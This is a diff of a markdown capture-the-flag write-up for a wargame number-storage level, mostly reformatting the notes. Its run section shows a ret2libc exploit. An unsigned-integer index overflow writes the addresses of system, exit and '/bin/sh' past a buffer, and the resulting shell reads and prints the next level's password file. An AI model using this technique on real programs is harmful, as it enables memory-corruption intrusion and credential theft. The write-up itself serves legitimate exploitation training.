@@ -11,9 +11,9 @@
   - read : asks index and outputs number
   - quit => exits the program
 
-- large number stores int max
+- large number stores unsigned int max
   - numbers are considered unsigned int
-- large index outputs error
+- index greater that UINT max return error
 
 ### EXPLOIT STRATEGY
 
@@ -43,30 +43,41 @@
 - overwrite sEIP
 
 ### RUN COMMAND
-----------------------------------------------------
-  Welcome to wil's crappy number storage service!
-----------------------------------------------------
- Commands:
-    store - store a number into the data storage
-    read  - read a number from the data storage
-    quit  - exit the program
-----------------------------------------------------
-   wil has reserved some storage :>
-----------------------------------------------------
+
+---
+
+#### Welcome to wil's crappy number storage service!
+
+```
+Commands:
+store - store a number into the data storage
+read - read a number from the data storage
+quit - exit the program
+```
+
+---
+
+#### wil has reserved some storage :>
+
+```
+Input command: store
+Number: 4159090384          <= address system
+Index: 1073741938           <= overflow UINT -> 114
+Completed store command successfully
 
 Input command: store
- Number: 4159090384  address system
- Index: 1073741938   overflow UINT -> 114
- Completed store command successfully
+Number: 4159040368          <= address of exit
+Index: 115
+Completed store command successfully
+
 Input command: store
- Number: 4159040368  address of exit
- Index: 115
- Completed store command successfully
-Input command: store
- Number: 4160264172 address of "/bin/sh"
- Index: 116
- Completed store command successfully
+Number: 4160264172          <= address of "/bin/sh"
+Index: 116
+Completed store command successfully
+
 Input command: quit
+
+
 $ whoami
 level08
 $ cd ../level09
@@ -74,3 +85,4 @@ $ cd ../level09
 $ cd ../level08
 $ cat .pass
 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+```
